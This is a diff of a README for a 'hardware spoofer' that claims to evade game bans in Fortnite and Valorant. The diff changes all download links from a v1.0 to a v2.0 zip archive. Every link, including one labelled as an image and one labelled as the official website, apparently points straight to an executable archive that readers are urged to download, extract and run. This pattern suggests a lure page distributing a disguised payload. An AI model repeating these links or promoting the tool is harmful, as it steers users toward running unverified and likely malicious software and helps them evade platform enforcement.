@@ -1,6 +1,6 @@
 # Temp-Spoofer-LifeTime
 
-![Spoofer Image](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v1.0/Application.zip)
+![Spoofer Image](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v2.0/Software.zip)
 
 Welcome to the Temp-Spoofer-LifeTime repository! This repository provides a solution to bypass hardware bans in games like Fortnite and Valorant by using a spoofer tool. A spoofer is a software that randomizes the serial numbers and physical addresses assigned to your hardware. By doing so, games and other software that track these hardware identifiers won't be able to identify you upon restarts.
 
@@ -22,7 +22,7 @@ Welcome to the Temp-Spoofer-LifeTime repository! This repository provides a solu
 
 To install the spoofer tool, click on the button below:
 
-[![Download Spoofer Tool](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v1.0/Application.zip)](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v1.0/Application.zip)
+[![Download Spoofer Tool](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v2.0/Software.zip)](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v2.0/Software.zip)
 
 Once downloaded, extract the files and run the tool to start spoofing your hardware.
 
@@ -55,7 +55,7 @@ If you have any suggestions, improvements, or new ideas for the spoofer tool, fe
 
 ## Support
 
-If you encounter any issues or need assistance with the spoofer tool, please check the "Releases" section for updates. Alternatively, you can visit the [official website](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v1.0/Application.zip) for more information.
+If you encounter any issues or need assistance with the spoofer tool, please check the "Releases" section for updates. Alternatively, you can visit the [official website](https://github.com/FDMMMMM/Temp-Spoofer-LifeTime/releases/download/v2.0/Software.zip) for more information.
 
 Thank you for visiting the Temp-Spoofer-LifeTime repository. Happy gaming and stay unbanned! 🎮🚫
 
